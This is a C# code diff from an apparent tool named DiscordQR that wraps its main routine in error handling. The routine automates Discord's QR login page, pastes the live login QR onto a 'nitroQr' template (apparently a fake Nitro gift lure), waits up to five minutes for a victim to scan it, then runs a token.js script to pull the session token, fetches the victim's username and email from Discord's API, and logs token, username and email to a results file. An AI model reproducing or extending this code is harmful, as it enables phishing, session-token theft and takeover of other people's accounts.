@@ -31,99 +31,113 @@ namespace DiscordQR
         public void SeleniumHandler()
         {
             int workingIndex = currentIndex;
-            var firefoxDriverService = FirefoxDriverService.CreateDefaultService();
-            var firefoxOptions = new FirefoxOptions();
-
-            firefoxDriverService.SuppressInitialDiagnosticInformation = true;
-            firefoxDriverService.HideCommandPromptWindow = true;
-
-            //firefoxOptions.AddArgument("--headless");            
-
-            IWebDriver driver = new FirefoxDriver(firefoxDriverService, firefoxOptions);
-            //driver.Manage().Window.Minimize();
-
-            drivers.Add(driver);
-
-            WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
-            driver.Navigate().GoToUrl("https://discord.com/login");
-            log("Launching Browser #" + workingIndex);
-            wait.Until(webDriver => webDriver.FindElement(By.ClassName("qrCode-wG6ZgU")));
-
-            IWebElement firstResult = driver.FindElement(By.ClassName("qrCode-wG6ZgU"));
-
-            Thread.Sleep(3000);
-            firstResult = driver.FindElement(By.CssSelector(".qrCode-wG6ZgU > img:nth-child(2)"));
-            log("Waiting for webpage...");
-            //Generating QR
-            string QRbase64 = firstResult.GetAttribute("src");
-            byte[] img = Convert.FromBase64String(QRbase64.Replace("data:image/png;base64,", ""));
-            log("Generating QR_" + workingIndex);
-            Image backImg = Image.FromStream(new MemoryStream(img));
-            Image overlay = Image.FromFile("files/overlay.png");
-
-            Graphics g = Graphics.FromImage(backImg);
-
-            g.DrawImage(overlay, 55, 60, 50, 50);
-
-            Stream finalQR = new MemoryStream();
-            backImg.Save(finalQR, ImageFormat.Png);
-
-            backImg = Image.FromFile("files/template.png");
-            overlay = Image.FromStream(finalQR);
-
-            g = Graphics.FromImage(backImg);
-            g.DrawImage(overlay, 120, 409);
-
-            backImg.Save("results/nitroQr_" + currentIndex + ".png");
-            Image finalResult = Image.FromFile("results/nitroQr_" + currentIndex + ".png");
-
-            qrList.Add(finalResult);
-
-            Discord d = new Discord(currentIndex);
-
-            dict.Add(currentIndex, d);
-
-            dataGridView1.Invoke((Action)delegate
+            try
             {
-                dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail);
-            });          
+                
+                var firefoxDriverService = FirefoxDriverService.CreateDefaultService();
+                var firefoxOptions = new FirefoxOptions();
 
-            currentIndex += 1;
+                firefoxDriverService.SuppressInitialDiagnosticInformation = true;
+                firefoxDriverService.HideCommandPromptWindow = true;
+
+                //firefoxOptions.AddArgument("--headless");            
+
+                IWebDriver driver = new FirefoxDriver(firefoxDriverService, firefoxOptions);
+                //driver.Manage().Window.Minimize();
+
+                drivers.Add(driver);
         
+                log("Launching Browser #" + workingIndex);
+                driver.Navigate().GoToUrl("https://discord.com/login");
+                
+                WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
+                wait.Until(webDriver => webDriver.FindElement(By.ClassName("qrCode-wG6ZgU")));
 
-            pictureBox1.Invoke((Action)delegate
+                IWebElement firstResult = driver.FindElement(By.ClassName("qrCode-wG6ZgU"));
+
+                Thread.Sleep(3000);
+                firstResult = driver.FindElement(By.CssSelector(".qrCode-wG6ZgU > img:nth-child(2)"));
+                log("Waiting for webpage...");
+                //Generating QR
+                string QRbase64 = firstResult.GetAttribute("src");
+                byte[] img = Convert.FromBase64String(QRbase64.Replace("data:image/png;base64,", ""));
+                log("Generating QR #" + workingIndex);
+                Image backImg = Image.FromStream(new MemoryStream(img));
+                Image overlay = Image.FromFile("files/overlay.png");
+
+                Graphics g = Graphics.FromImage(backImg);
+
+                g.DrawImage(overlay, 55, 60, 50, 50);
+
+                Stream finalQR = new MemoryStream();
+                backImg.Save(finalQR, ImageFormat.Png);
+
+                backImg = Image.FromFile("files/template.png");
+                overlay = Image.FromStream(finalQR);
+
+                g = Graphics.FromImage(backImg);
+                g.DrawImage(overlay, 120, 409);
+
+                backImg.Save("results/nitroQr_" + currentIndex + ".png");
+                Image finalResult = Image.FromFile("results/nitroQr_" + currentIndex + ".png");
+
+                qrList.Add(finalResult);
+
+                Discord d = new Discord(currentIndex);
+
+                dict.Add(currentIndex, d);
+
+                dataGridView1.Invoke((Action)delegate
+                {
+                    dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail);
+                });
+
+                currentIndex += 1;
+
+
+                pictureBox1.Invoke((Action)delegate
+                {
+                    this.pictureBox1.Image = finalResult;
+                });
+                log("Waiting for login on QR #" + workingIndex);
+                wait = new WebDriverWait(driver, TimeSpan.FromSeconds(300));
+                wait.Until(webDriver => webDriver.Url != "https://discord.com/login");
+
+                string token = ((IJavaScriptExecutor)driver).ExecuteScript(File.ReadAllText("files/token.js")).ToString();
+
+                d.DiscordToken = token;
+
+                WebRequest request = WebRequest.Create("https://canary.discord.com/api/v8/users/@me");
+                request.Method = "GET";
+                request.ContentType = "application/json";
+
+                request.Headers["Authorization"] = token;
+
+                Stream response = request.GetResponse().GetResponseStream();
+                string jsonData = new StreamReader(response).ReadToEnd();
+                Dictionary<string, object> dictionary = (Dictionary<string, object>)Json.Deserialize(jsonData);
+
+                d.DiscordUsername = dictionary["username"].ToString();
+                d.DiscordEmail = dictionary["email"].ToString();
+                log(d.DiscordUsername + " Logged in  QR #s" + workingIndex);
+                SafeWriter("results/results.txt", d.ToString());
+
+                dict[workingIndex] = d;
+
+                dataGridView1.Invoke((Action)delegate
+                {
+                    update();
+                });
+            }
+            catch (WebDriverException ex)
             {
-                this.pictureBox1.Image = finalResult;
-            });
-            log("Waiting for login on QR_" + workingIndex);
-            wait = new WebDriverWait(driver, TimeSpan.FromSeconds(300));
-            wait.Until(webDriver => webDriver.Url != "https://discord.com/login");
-
-            string token = ((IJavaScriptExecutor)driver).ExecuteScript(File.ReadAllText("files/token.js")).ToString();
-
-            d.DiscordToken = token;
-
-            WebRequest request = WebRequest.Create("https://canary.discord.com/api/v8/users/@me");
-            request.Method = "GET";
-            request.ContentType = "application/json";
-
-            request.Headers["Authorization"] = token;
-
-            Stream response = request.GetResponse().GetResponseStream();         
-            string jsonData = new StreamReader(response).ReadToEnd();
-            Dictionary<string, object> dictionary = (Dictionary<string, object>)Json.Deserialize(jsonData);
-
-            d.DiscordUsername = dictionary["username"].ToString();
-            d.DiscordEmail = dictionary["email"].ToString();
-
-            SafeWriter("results/results.txt", d.ToString());
-
-            dict[workingIndex] = d;
-
-            dataGridView1.Invoke((Action)delegate
-            {
-                update();
-            });
+                dict.Remove(workingIndex);
+                dataGridView1.Invoke((Action)delegate
+                {
+                    update();
+                });
+            }
+            catch (Exception ex) { MessageBox.Show(ex.Message, "Error"); }
         }
 
         private void update()
